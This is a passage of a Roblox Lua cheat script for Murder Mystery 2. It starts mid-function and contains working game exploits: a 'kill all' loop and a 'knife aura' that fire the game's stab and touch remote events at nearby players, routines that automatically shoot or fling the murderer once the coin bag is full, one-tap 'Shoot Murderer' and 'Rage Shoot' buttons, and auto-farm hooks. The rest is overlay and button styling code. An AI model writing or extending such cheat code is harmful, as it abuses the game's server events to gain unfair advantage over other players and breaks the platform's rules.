						if flag93 and not flag93.Dead and humanoid and humanoid.Health > 0 and character and character:IsA("BasePart") then
							table.insert(tbl33, character)
						end
					end

					continue
				end

				break
			end

			local killAllLoopId2 = _G.__KillAllLoopId == killAllLoopId and #tbl33 > 0
			local n3 = 0

			if killAllLoopId2 then
				if pcall(function()
					knifeStabbed:FireServer()
				end) then
					task.wait(0.035)

					for _, item31 in ipairs(tbl33) do
						if _G.__KillAllLoopId == killAllLoopId then
							if pcall(function()
								handleTouched:FireServer(item31)
							end) then
								n3 += 1
							end

							continue
						end

						break
					end
				end
			end

			_G.KillAllBusy = false
			_G.KillAllStatus = "Finished: " .. n3 .. " stabs"
		end)

		return true, "Started"
	end

	_G.KnifeAuraEnabled = false
	_G.KnifeAuraRange = 12
	_G.KnifeAuraVisibleOnly = true
	local n3 = 0
	local n4 = 0
	local raycastParams = RaycastParams.new()
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
	raycastParams.IgnoreWater = true

	table.insert(_G.CoinESPConn, RunService.Heartbeat:Connect(function(deltaTime)
		n4 += deltaTime
		if n4 < 0.1 then
			return
		end
		n4 = 0
		if not _G.KnifeAuraEnabled or not _G.InRound or _G.KillAllBusy then
			return
		end

		if os.clock() - n3 < 0.45 then
			return
		end
		local flag94 = CurrentRoundClient.PlayerData[localPlayer.Name]
		if not flag94 or flag94.Role ~= "Murderer" or flag94.Dead then
			return
		end
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return
		end
		local obj18 = func80(false)
		if not obj18 then
			return
		end
		local events = obj18:FindFirstChild("Events")
		local knifeStabbed = events and events:FindFirstChild("KnifeStabbed")
		local handleTouched = events and events:FindFirstChild("HandleTouched")
		if not knifeStabbed or not handleTouched then
			return
		end
		local list19 = {}

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				local flag95 = CurrentRoundClient.PlayerData[player.Name]
				local character2 = player.Character
				local humanoid = character2 and character2:FindFirstChildWhichIsA("Humanoid")
				local upperTorso = character2 and (character2:FindFirstChild("UpperTorso") or character2:FindFirstChild("Torso") or character2:FindFirstChild("HumanoidRootPart"))

				if flag95 and not flag95.Dead and humanoid and humanoid.Health > 0 and upperTorso and (upperTorso.Position - humanoidRootPart.Position).Magnitude <= _G.KnifeAuraRange then
					local flag96 = true

					if _G.KnifeAuraVisibleOnly then
						raycastParams.FilterDescendantsInstances = { character, character2 }
						flag96 = workspace:Raycast(humanoidRootPart.Position, upperTorso.Position - humanoidRootPart.Position, raycastParams) == nil
					end

					if flag96 then
						list19[#list19 + 1] = upperTorso
					end
				end
			end
		end

		if #list19 == 0 then
			return
		end
		n3 = os.clock()

		task.spawn(function()
			if not pcall(function()
				knifeStabbed:FireServer()
			end) then
				return
			end
			task.wait(0.035)

			for _, item32 in ipairs(list19) do
				pcall(function()
					handleTouched:FireServer(item32)
				end)
			end
		end)
	end))
end

_G.KnifeAuraSetEnabled = function(flag97)
	_G.KnifeAuraEnabled = flag97 and true or false
end

_G.KnifeAuraSetRange = function(param50)
	_G.KnifeAuraRange = math.clamp(tonumber(param50) or 12, 4, 40)
end

_G.KnifeAuraSetVisibleOnly = function(flag98)
	_G.KnifeAuraVisibleOnly = flag98 and true or false
end

do
	local flag99 = false
	local n2 = 0

	table.insert(_G.CoinESPConn, RunService.Heartbeat:Connect(function(deltaTime)
		n2 += deltaTime
		if n2 < 0.08 then
			return
		end
		n2 = 0
		if not ((_G.FlingMurdererAfterBagFullEnabled or _G.ShootMurdererAfterBagFullEnabled or _G.KillAllAfterBagFullEnabled) and _G.BagFull and _G.InRound and _G.__RealInRound) then
			flag99 = false
			return
		end

		if flag99 then
			return
		end
		flag99 = true

		task.spawn(function()
			local flag100 = CurrentRoundClient.PlayerData[localPlayer.Name]
			local flag101 = flag100 and flag100.Role == "Murderer" and not flag100.Dead

			local function func82()
				for _, value75 in pairs(CurrentRoundClient.PlayerData) do
					if value75 and value75.Role == "Murderer" and not value75.Dead then
						return true
					end
				end

				return false
			end

			if _G.ShootMurdererAfterBagFullEnabled and not flag101 then
				local autoFarmEnabled2 = _G.AutoFarmEnabled == true

				if autoFarmEnabled2 then
					_G.AutoFarmSetEnabled(false)
					task.wait(0.08)
				end

				local n3 = os.clock() + 25
				local n4 = 0
				local n5 = 0
				local flag102

				while true do
					local realInRound = os.clock() < n3 and _G.InRound and _G.__RealInRound
					flag102 = false

					if realInRound then
						if not func82() then
							flag102 = true
							break
						else
							local flag103 = CurrentRoundClient.PlayerData[localPlayer.Name]

							if not (not flag103 or flag103.Dead) then
								n4 += 1

								if not (n4 > 20) then
									n5 = _G.ShootMurdererRage() and 0 or n5 + 1
									if not (n5 >= 5) then
										task.wait(0.3)
										continue
									end
								end
							end
						end
					end

					break
				end

				flag102 = flag102 or not func82()

				if _G.WindNotify then
					local windNotify = _G.WindNotify
					local flag104 = flag102 and "Murderer down after " .. n4 .. " shot(s)"

					if not flag104 then
						flag104 = tostring(_G.ShootMurdererRageStatus or "Could not land a shot")
					end

					windNotify("Bag Full: Shoot Murderer", flag104, flag102 and "crosshair" or "circle-x")
				end

				if autoFarmEnabled2 then
					_G.AutoFarmSetEnabled(true)
				end
			end

			if _G.FlingMurdererAfterBagFullEnabled and not flag101 and func82() then
				local autoFarmEnabled3 = _G.AutoFarmEnabled == true

				if autoFarmEnabled3 then
					_G.AutoFarmSetEnabled(false)
					task.wait(0.08)
				end

				local flag105, value76 = _G.RoleFlingTarget({ "Murderer" })

				if _G.WindNotify then
					_G.WindNotify("Bag Full: Fling Murderer", tostring(value76), flag105 and "skull" or "circle-x")
				end

				if flag105 then
					while true do
						task.wait(0.05)
						if not (not _G.RoleFlingBusy or not _G.InRound) then
							continue
						end
						break
					end
				end

				if autoFarmEnabled3 then
					_G.AutoFarmSetEnabled(true)
				end
			end

			if _G.KillAllAfterBagFullEnabled and flag101 then
				local flag106, value77 = _G.KillAllMurderer()

				if _G.WindNotify then
					_G.WindNotify("Bag Full: Kill All", tostring(value77), flag106 and "skull" or "circle-x")
				end
			end
		end)
	end))
end

print("Auto Farm core ready (velocity-based fly, no CFrame teleports)")
_G.DailyQuestCheckerEnabled = false

do
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegDailyQuestChecker"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 90
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Enabled = false
	screenGui.Parent = func2()
	_G.DailyQuestCheckerGui = screenGui
	local frame = Instance.new("Frame")
	frame.Name = "Holder"
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.Position = UDim2.new(0.5, 0, 0.22, 0)
	frame.Size = UDim2.fromOffset(360, 150)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.ClipsDescendants = true
	frame.Parent = screenGui
	local value78 = nil
	local value79 = nil

	local function func83()
		local playerGui = localPlayer:FindFirstChild("PlayerGui")
		if not playerGui then
			return nil
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("Frame") and descendant.Name == "DailyCoins" then
				local title = descendant:FindFirstChild("Title", true)
				title = title and title:FindFirstChild("TitleLabel", true)
				if title and title:IsA("TextLabel") and string.find(string.upper(title.Text), "DAILY QUEST", 1, true) then
					return descendant
				end
			end
		end

		return nil
	end

	local function func84(param51, instance13, instance14)
		if instance14 == param51 then
			return instance13
		end
		local tbl34 = {}

		while instance14 and instance14 ~= param51 do
			table.insert(tbl34, 1, instance14.Name)
			instance14 = instance14.Parent
		end

		if instance14 ~= param51 then
			return nil
		end

		for _, item33 in ipairs(tbl34) do
			instance13 = instance13 and instance13:FindFirstChild(item33)
		end

		return instance13
	end

	local function func85(list20)
		for _, descendant in ipairs(list20:GetDescendants()) do
			if descendant:IsA("LocalScript") or descendant:IsA("Script") or descendant:IsA("ModuleScript") then
				descendant:Destroy()
			elseif descendant:IsA("GuiButton") then
				descendant.Active = false
				descendant.Selectable = false
				descendant.AutoButtonColor = false
			elseif descendant:IsA("ScrollingFrame") then
				descendant.ScrollingEnabled = false
				descendant.ScrollBarThickness = 0
				descendant.ScrollBarImageTransparency = 1
				descendant.TopImage = ""
				descendant.MidImage = ""
				descendant.BottomImage = ""
				descendant.HorizontalScrollBarInset = Enum.ScrollBarInset.None
			end
		end
	end

	local function func86(instance15)
		local title = instance15 and instance15:FindFirstChild("Title")

		if title and title:IsA("GuiObject") then
			title.Visible = false
		end

		instance15 = instance15 and instance15:FindFirstChild("RefreshLabel", true)

		if instance15 and instance15:IsA("GuiObject") then
			instance15.Visible = false
		end
	end

	local function func87(flag107, parent)
		if not flag107 or not parent then
			return
		end
		local absoluteSize = flag107.AbsoluteSize
		local n2 = math.max(absoluteSize.X, 1)
		local n3 = math.max(absoluteSize.Y, 1)
		local x = frame.AbsoluteSize.X > 0 and frame.AbsoluteSize.X or 360
		local y = frame.AbsoluteSize.Y > 0 and frame.AbsoluteSize.Y or 150
		local scale = math.min(x / n2, y / n3)
		parent.Size = UDim2.fromOffset(n2, n3)
		parent.Position = UDim2.fromOffset(math.floor((x - n2 * scale) * 0.5), math.floor((y - n3 * scale) * 0.5))
		local marbegCompactScale = parent:FindFirstChild("MarbegCompactScale")

		if not marbegCompactScale then
			marbegCompactScale = Instance.new("UIScale")
			marbegCompactScale.Name = "MarbegCompactScale"
			marbegCompactScale.Parent = parent
		end

		marbegCompactScale.Scale = scale
	end

	local function func88(instance16)
		instance16 = instance16 and instance16:FindFirstChildWhichIsA("ScrollingFrame", true)
		if not instance16 then
			return
		end
		local amountLabel = instance16:FindFirstChild("AmountLabel", true)
		if not amountLabel or not amountLabel:IsA("TextLabel") then
			return
		end
		local n2 = instance16.AbsolutePosition.X + instance16.AbsoluteSize.X * 0.5
		local n3 = amountLabel.AbsolutePosition.X + amountLabel.AbsoluteSize.X * 0.5
		local n4 = math.max(instance16.AbsoluteCanvasSize.X - instance16.AbsoluteSize.X, 0)
		instance16.CanvasPosition = Vector2.new(math.clamp(instance16.CanvasPosition.X + n3 - n2, 0, n4), instance16.CanvasPosition.Y)
	end

	local function func89(obj19)
		if value79 then
			pcall(function()
				value79:Destroy()
			end)
		end

		value78 = obj19
		value79 = nil
		if not obj19 then
			return
		end

		local ok, result = pcall(function()
			return obj19:Clone()
		end)

		if not ok or not result then
			return
		end
		value79 = result
		result.Name = "DailyQuestPanel"
		result.AnchorPoint = Vector2.new(0, 0)
		result.Position = UDim2.fromOffset(0, 0)
		result.Visible = true
		result.Parent = frame
		func85(result)
		func87(obj19, result)
		func86(result)

		task.defer(function()
			if value79 == result and result.Parent then
				func88(result)
			end
		end)
	end

	local function func90()
		local result10 = func83()

		if result10 ~= value78 or not value79 or not value79.Parent then
			func89(result10)
		end

		if not result10 or not value79 then
			return
		end

		for _, descendant in ipairs(result10:GetDescendants()) do
			local obj20 = func84(result10, value79, descendant)

			if obj20 then
				pcall(function()
					if descendant:IsA("GuiObject") and obj20:IsA("GuiObject") then
						obj20.Visible = descendant.Visible
						obj20.Position = descendant.Position
						obj20.Size = descendant.Size
						obj20.LayoutOrder = descendant.LayoutOrder
						obj20.BackgroundColor3 = descendant.BackgroundColor3
						obj20.BackgroundTransparency = descendant.BackgroundTransparency
					end

					if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and (obj20:IsA("TextLabel") or obj20:IsA("TextButton")) then
						obj20.Text = descendant.Text
						obj20.TextColor3 = descendant.TextColor3
						obj20.TextTransparency = descendant.TextTransparency
					end

					if (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) and (obj20:IsA("ImageLabel") or obj20:IsA("ImageButton")) then
						obj20.Image = descendant.Image
						obj20.ImageColor3 = descendant.ImageColor3
						obj20.ImageTransparency = descendant.ImageTransparency
					end

					if descendant:IsA("ScrollingFrame") and obj20:IsA("ScrollingFrame") then
						obj20.CanvasPosition = descendant.CanvasPosition
						obj20.CanvasSize = descendant.CanvasSize
						obj20.ScrollingEnabled = false
						obj20.ScrollBarThickness = 0
						obj20.ScrollBarImageTransparency = 1
						obj20.TopImage = ""
						obj20.MidImage = ""
						obj20.BottomImage = ""
						obj20.HorizontalScrollBarInset = Enum.ScrollBarInset.None
					end
				end)
			end
		end

		func87(result10, value79)
		func86(value79)
		func88(value79)
	end

	_G.DailyQuestCheckerSetEnabled = function(dailyQuestCheckerEnabled)
		_G.DailyQuestCheckerEnabled = dailyQuestCheckerEnabled
		screenGui.Enabled = dailyQuestCheckerEnabled

		if dailyQuestCheckerEnabled then
			pcall(func90)
		end
	end

	local dailyQuestLoopId = {}
	_G.__DailyQuestLoopId = dailyQuestLoopId

	task.spawn(function()
		while _G.__DailyQuestLoopId == dailyQuestLoopId do
			task.wait(0.25)

			if _G.DailyQuestCheckerEnabled then
				pcall(func90)
			end
		end
	end)
end

_G.ActionButtonTextColor = Color3.fromRGB(255, 255, 255)
_G.__ActionButtons = _G.__ActionButtons or {}
_G.__ActionButtonLayouts = _G.__ActionButtonLayouts or {}
_G.ActionButtonSize = tonumber(_G.ActionButtonSize) or 72

do
	local HttpService = game:GetService("HttpService")
	local tbl35 = {}
	local n2 = 72
	local n3 = 0

	pcall(function()
		if isfile and readfile and isfile("mm2_button_positions.json") then
			local data = HttpService:JSONDecode(readfile("mm2_button_positions.json"))

			if type(data) == "table" then
				if type(data.Positions) == "table" then
					tbl35 = data.Positions
					n2 = tonumber(data.Size) or n2
				else
					tbl35 = data
					n2 = tonumber(data.__Size) or n2
					tbl35.__Size = nil
				end
			end
		end
	end)

	_G.ActionButtonSize = math.clamp(n2, 48, 120)

	local function saveActionButtonLayout()
		n3 += 1
		local flag108 = n3

		task.delay(0.6, function()
			if flag108 ~= n3 or not writefile then
				return
			end

			pcall(function()
				writefile("mm2_button_positions.json", HttpService:JSONEncode({ Positions = tbl35, Size = _G.ActionButtonSize }))
			end)
		end)
	end

	_G.__SaveActionButtonLayout = saveActionButtonLayout

	_G.__TrackButtonPosition = function(param52, part9)
		_G.__ActionButtonLayouts[param52] = { button = part9, defaultPosition = part9.Position }
		local entry10 = tbl35[param52]

		if type(entry10) == "table" and #entry10 == 4 then
			part9.Position = UDim2.new(entry10[1], entry10[2], entry10[3], entry10[4])
		end

		part9:GetPropertyChangedSignal("Position"):Connect(function()
			local position = part9.Position
			tbl35[param52] = { position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset }
			saveActionButtonLayout()
		end)
	end

	_G.__ResetActionButtonPositions = function()
		for k, actionButtonLayout in pairs(_G.__ActionButtonLayouts) do
			local button = actionButtonLayout.button

			if button and button.Parent and actionButtonLayout.defaultPosition then
				button.Position = actionButtonLayout.defaultPosition
				local position = button.Position
				tbl35[k] = { position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset }
			end
		end

		saveActionButtonLayout()
		return true
	end
end

_G.__StyleSquareButton = function(parent, param53, text, backgroundColor3)
	local n2 = math.clamp(tonumber(_G.ActionButtonSize) or 72, 48, 120)
	parent.Size = UDim2.fromOffset(n2, n2)
	parent.BackgroundTransparency = 1
	parent.BorderSizePixel = 0
	parent.AutoButtonColor = false
	parent.Text = ""
	parent.ClipsDescendants = false

	local function createUICorner(parent2, cornerRadius)
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = cornerRadius
		uiCorner.Parent = parent2
		return uiCorner
	end

	local tbl36 = {}

	for i, item34 in ipairs({ { grow = 6, alpha = 0.86 }, { grow = 14, alpha = 0.94 } }) do
		local frame = Instance.new("Frame")
		frame.Name = "Halo" .. i
		frame.AnchorPoint = Vector2.new(0.5, 0.5)
		frame.Position = UDim2.fromScale(0.5, 0.5)
		frame.BackgroundColor3 = backgroundColor3
		frame.BackgroundTransparency = item34.alpha
		frame.BorderSizePixel = 0
		frame.ZIndex = 1
		frame.Parent = parent
		tbl36[i] = { frame = frame, grow = item34.grow, corner = createUICorner(frame, UDim.new(0, 18)) }
	end

	local frame = Instance.new("Frame")
	frame.Name = "Plate"
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.Position = UDim2.fromScale(0.5, 0.5)
	frame.Size = UDim2.fromScale(1, 1)
	frame.BackgroundColor3 = Color3.new(1, 1, 1)
	frame.BackgroundTransparency = 0.08
	frame.BorderSizePixel = 0
	frame.ZIndex = 2
	frame.Parent = parent
	local uICorner = createUICorner(frame, UDim.new(0, 16))
	local uiGradient = Instance.new("UIGradient")
	uiGradient.Rotation = 90
	local colorSequence = ColorSequence.new
	local value80 = ColorSequenceKeypoint.new(0, backgroundColor3:Lerp(Color3.fromRGB(24, 26, 34), 0.72))
	local value81 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(20, 22, 29))
	local new = ColorSequenceKeypoint.new
	local color = Color3.fromRGB
	local tbl37 = { value80, value81 }

	do
		local values = table.pack(new(1, color(12, 13, 18)))
		table.move(values, 1, values.n, 3, tbl37)
	end

	uiGradient.Color = colorSequence(tbl37)
	uiGradient.Parent = frame
	local uiStroke = Instance.new("UIStroke")
	uiStroke.Color = backgroundColor3
	uiStroke.Thickness = 1.6
	uiStroke.Transparency = 0.1
	uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	uiStroke.LineJoinMode = Enum.LineJoinMode.Round
	uiStroke.Parent = frame
	local uiGradient2 = Instance.new("UIGradient")
	uiGradient2.Rotation = 90
	local color2 = Color3.fromRGB
	uiGradient2.Color = ColorSequence.new(Color3.new(1, 1, 1), color2(120, 120, 120))
	local new2 = NumberSequenceKeypoint.new
	uiGradient2.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0), new2(1, 0.45) })
	uiGradient2.Parent = uiStroke
	local frame2 = Instance.new("Frame")
	frame2.Name = "Badge"
	frame2.AnchorPoint = Vector2.new(0.5, 0)
	frame2.BackgroundColor3 = backgroundColor3
	frame2.BackgroundTransparency = 0.72
	frame2.BorderSizePixel = 0
	frame2.ZIndex = 3
	frame2.Parent = frame
	createUICorner(frame2, UDim.new(1, 0))
	local uiGradient3 = Instance.new("UIGradient")
	uiGradient3.Rotation = 90
	local new3 = NumberSequenceKeypoint.new
	uiGradient3.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0), new3(1, 0.5) })
	uiGradient3.Parent = frame2
	local uiScale = Instance.new("UIScale")
	uiScale.Scale = 1
	uiScale.Parent = parent
	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Name = "Icon"
	imageLabel.BackgroundTransparency = 1
	imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	imageLabel.ImageColor3 = _G.ActionButtonTextColor
	imageLabel.ScaleType = Enum.ScaleType.Fit
	imageLabel.ZIndex = 4
	imageLabel.Parent = frame
	imageLabel:SetAttribute("IconName", param53)
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "Caption"
	textLabel.BackgroundTransparency = 1
	textLabel.Text = text
	textLabel.TextColor3 = _G.ActionButtonTextColor
	textLabel.TextWrapped = false
	textLabel.RichText = false
	textLabel.LineHeight = 0.95
	textLabel.TextYAlignment = Enum.TextYAlignment.Top
	textLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy)
	textLabel.TextStrokeTransparency = 0.75
	textLabel.AutoLocalize = false
	textLabel.ZIndex = 4
	textLabel.Parent = frame
	local tbl38 = { button = parent, icon = imageLabel, caption = textLabel, pressScale = uiScale }
	table.insert(_G.__ActionButtons, tbl38)

	local function applySize(param54)
		local n3 = math.clamp(tonumber(param54) or 72, 48, 120)
		parent.Size = UDim2.fromOffset(n3, n3)
		local n4 = math.floor(n3 * 0.26)
		uICorner.CornerRadius = UDim.new(0, n4)

		for _, item35 in ipairs(tbl36) do
			item35.frame.Size = UDim2.new(1, item35.grow, 1, item35.grow)
			item35.corner.CornerRadius = UDim.new(0, n4 + math.floor(item35.grow / 2))
		end

		local n5 = math.floor(n3 * 0.46)
		frame2.Size = UDim2.fromOffset(n5, n5)
		frame2.Position = UDim2.new(0.5, 0, 0, math.floor(n3 * 0.1))
		local floor = math.floor
		imageLabel.Size = UDim2.fromOffset(math.floor(n3 * 0.3), floor(n3 * 0.3))
		imageLabel.Position = UDim2.new(0.5, 0, 0, math.floor(n3 * 0.1 + n5 / 2))
		local floor2 = math.floor
		textLabel.Position = UDim2.new(0, math.floor(n3 * 0.05), 0, floor2(n3 * 0.6))
		local floor3 = math.floor
		textLabel.Size = UDim2.new(1, -math.floor(n3 * 0.1), 0, floor3(n3 * 0.34))
		textLabel.TextSize = math.clamp(math.floor(n3 * 0.13), 8, 17)
	end

	tbl38.applySize = applySize
	applySize(n2)

	parent.MouseButton1Down:Connect(function()
		TweenService:Create(uiScale, TweenInfo.new(0.08), { Scale = 0.93 }):Play()
	end)

	local function func91()
		TweenService:Create(uiScale, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()

		for i, item36 in ipairs(tbl36) do
			TweenService:Create(item36.frame, TweenInfo.new(0.15), { BackgroundTransparency = i == 1 and 0.86 or 0.94 }):Play()
		end
	end

	parent.MouseButton1Up:Connect(func91)
	parent.MouseLeave:Connect(func91)

	parent.MouseEnter:Connect(function()
		TweenService:Create(uiScale, TweenInfo.new(0.12), { Scale = 1.06 }):Play()

		for i, item37 in ipairs(tbl36) do
			TweenService:Create(item37.frame, TweenInfo.new(0.15), { BackgroundTransparency = i == 1 and 0.72 or 0.86 }):Play()
		end
	end)

	return uiStroke, imageLabel, textLabel
end

_G.__SetActionButtonSize = function(param55)
	local actionButtonSize = math.clamp(tonumber(param55) or 72, 48, 120)
	_G.ActionButtonSize = actionButtonSize

	for _, actionButton in ipairs(_G.__ActionButtons) do
		if actionButton.applySize then
			pcall(actionButton.applySize, actionButtonSize)
		end
	end

	return actionButtonSize
end

local tbl39 = {
	__mm2_default_knife = "rbxassetid://148256623",
	__mm2_throw_knife = "rbxassetid://444186601",
	__mm2_default_gun = "rbxassetid://197518111",
}

_G.__ApplyActionButtonIcons = function()
	local windUI = _G.WindUI

	for _, actionButton in ipairs(_G.__ActionButtons) do
		local attribute = actionButton.icon and actionButton.icon:GetAttribute("IconName")

		if attribute and actionButton.icon.Parent then
			local entry11 = tbl39[attribute]

			if entry11 then
				actionButton.icon.Image = entry11
			elseif windUI and windUI.Creator and windUI.Creator.Icon then
				local ok, result = pcall(windUI.Creator.Icon, attribute)

				if ok and type(result) == "table" and result[1] then
					actionButton.icon.Image = result[1]
				end
			end
		end
	end
end

_G.SetActionButtonTextColor = function(actionButtonTextColor)
	if typeof(actionButtonTextColor) ~= "Color3" then
		return
	end
	_G.ActionButtonTextColor = actionButtonTextColor

	for _, actionButton in ipairs(_G.__ActionButtons) do
		if actionButton.icon and actionButton.icon.Parent then
			actionButton.icon.ImageColor3 = actionButtonTextColor
		end

		if actionButton.caption and actionButton.caption.Parent then
			actionButton.caption.TextColor3 = actionButtonTextColor
		end
	end
end

do
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegQuickShoot"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 95
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Enabled = false
	screenGui.Parent = func2()
	_G.QuickShootGui = screenGui
	local textButton = Instance.new("TextButton")
	textButton.Name = "ShootMurderer"
	textButton.AnchorPoint = Vector2.new(0, 0.5)
	textButton.Position = UDim2.new(0, 500, 0.38, 0)
	_G.__TrackButtonPosition("QuickShoot", textButton)
	textButton.AutoLocalize = false
	textButton.Parent = screenGui
	local value82 = _G.__StyleSquareButton(textButton, "__mm2_default_gun", "SHOOT", Color3.fromRGB(48, 145, 255))
	_G.QuickShootButtonRequested = false

	_G.QuickShootButtonSetEnabled = function(flag109)
		_G.QuickShootButtonRequested = flag109 and true or false
		screenGui.Enabled = _G.QuickShootButtonRequested
	end

	textButton.MouseEnter:Connect(function()
		TweenService:Create(value82, TweenInfo.new(0.13), { Color = Color3.fromRGB(120, 195, 255), Transparency = 0 }):Play()
	end)

	textButton.MouseLeave:Connect(function()
		TweenService:Create(value82, TweenInfo.new(0.13), { Color = Color3.fromRGB(48, 145, 255), Transparency = 0.15 }):Play()
	end)

	local flag110 = false
	local flag111 = false
	local position = nil
	local position2 = nil
	local value83 = nil

	textButton.InputBegan:Connect(function(input)
		if _G.LockButtonsEnabled then
			return
		end

		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag110 = true
			flag111 = false
			position = input.Position
			position2 = textButton.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag110 = false
				end
			end)
		end
	end)

	textButton.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			value83 = input
		end
	end)

	table.insert(_G.CoinESPConn, UserInputService.InputChanged:Connect(function(input)
		if flag110 and input == value83 then
			local n2 = input.Position - position

			if n2.Magnitude > 6 then
				flag111 = true
			end

			textButton.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n2.X, position2.Y.Scale, position2.Y.Offset + n2.Y)
		end
	end))

	textButton.Activated:Connect(function()
		if flag111 or flag41 then
			return
		end

		if not _G.InRound or not _G.__RealInRound then
			if _G.WindNotify then
				_G.WindNotify("Shoot Murderer (LEGIT)", "You are not in an active round.", "circle-x")
			end

			return
		end

		if not func46() then
			if _G.WindNotify then
				_G.WindNotify("Shoot Murderer (LEGIT)", "Sheriff gun required.", "circle-x")
			end

			return
		end

		if not func45() then
			if _G.WindNotify then
				_G.WindNotify("Shoot Murderer (LEGIT)", "No living murderer found.", "circle-x")
			end

			return
		end

		task.spawn(function()
			local value84 = _G.ShootMurderer()

			if _G.WindNotify then
				if value84 then
					_G.WindNotify("Shoot Murderer (LEGIT)", "Shot fired.", "circle-check")
				else
					_G.WindNotify("Shoot Murderer (LEGIT)", _G.ShootMurdererStatus or "Shot could not be fired.", "circle-x")
				end
			end
		end)
	end)

	local quickShootLoopId = {}
	_G.__QuickShootLoopId = quickShootLoopId

	task.spawn(function()
		while _G.__QuickShootLoopId == quickShootLoopId and textButton.Parent do
			task.wait(0.2)
			screenGui.Enabled = _G.QuickShootButtonRequested
		end
	end)
end

do
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegQuickRageShoot"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 96
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Enabled = false
	screenGui.Parent = func2()
	_G.QuickRageShootGui = screenGui
	local textButton = Instance.new("TextButton")
	textButton.Name = "ShootMurdererRage"
	textButton.AnchorPoint = Vector2.new(0, 0.5)
	textButton.Position = UDim2.new(0, 584, 0.38, 0)
	_G.__TrackButtonPosition("RageShoot", textButton)
	textButton.Active = true
	textButton.AutoLocalize = false
	textButton.Parent = screenGui
	local value85 = _G.__StyleSquareButton(textButton, "__mm2_default_gun", "RAGE\nSHOOT", Color3.fromRGB(64, 178, 255))
	_G.QuickRageShootButtonRequested = false

	_G.QuickRageShootButtonSetEnabled = function(flag112)
		_G.QuickRageShootButtonRequested = flag112 and true or false
		screenGui.Enabled = _G.QuickRageShootButtonRequested
	end

	textButton.MouseEnter:Connect(function()
		TweenService:Create(value85, TweenInfo.new(0.13), { Color = Color3.fromRGB(140, 210, 255), Transparency = 0 }):Play()
	end)

	textButton.MouseLeave:Connect(function()
		TweenService:Create(value85, TweenInfo.new(0.13), { Color = Color3.fromRGB(64, 178, 255), Transparency = 0.1 }):Play()
	end)

	local flag113 = false
	local flag114 = false
	local position = nil
	local position2 = nil
	local value86 = nil

	textButton.InputBegan:Connect(function(input)
		if _G.LockButtonsEnabled then
			return
		end

		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag113 = true
			flag114 = false
			position = input.Position
			position2 = textButton.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag113 = false
				end
			end)
		end
	end)

	textButton.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			value86 = input
		end
	end)

	table.insert(_G.CoinESPConn, UserInputService.InputChanged:Connect(function(input)
		if flag113 and input == value86 then
			local n2 = input.Position - position

			if n2.Magnitude > 6 then
				flag114 = true
			end

			textButton.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n2.X, position2.Y.Scale, position2.Y.Offset + n2.Y)
		end
	end))

	textButton.Activated:Connect(function()
		if flag114 or flag41 then
			return
		end

		task.spawn(function()
			local flag115 = _G.ShootMurdererRage()

			if _G.WindNotify then
				_G.WindNotify("Shoot Murderer (RAGE)", flag115 and "Shot fired." or _G.ShootMurdererRageStatus or "Shot failed.", flag115 and "crosshair" or "circle-x")
			end
		end)
	end)
end

_G.BulletTracerEnabled = true
_G.BulletTracerDuration = 0.8
_G.BulletTracerOnlyMine = true

do
	local Debris = game:GetService("Debris")

	if _G.__BulletTracerConn then
		pcall(function()
			_G.__BulletTracerConn:Disconnect()
		end)
	end

	local marbegBulletTracers = workspace:FindFirstChild("MarbegBulletTracers")

	if marbegBulletTracers then
		pcall(function()
			marbegBulletTracers:Destroy()
		end)
	end

	local folder = Instance.new("Folder")
	folder.Name = "MarbegBulletTracers"
	folder.Parent = workspace
	_G.BulletTracerFolder = folder
	_G.BulletTracerWidth = 0.25
	_G.BulletTracerSelfColor = _G.BulletTracerSelfColor or Color3.fromRGB(45, 155, 255)

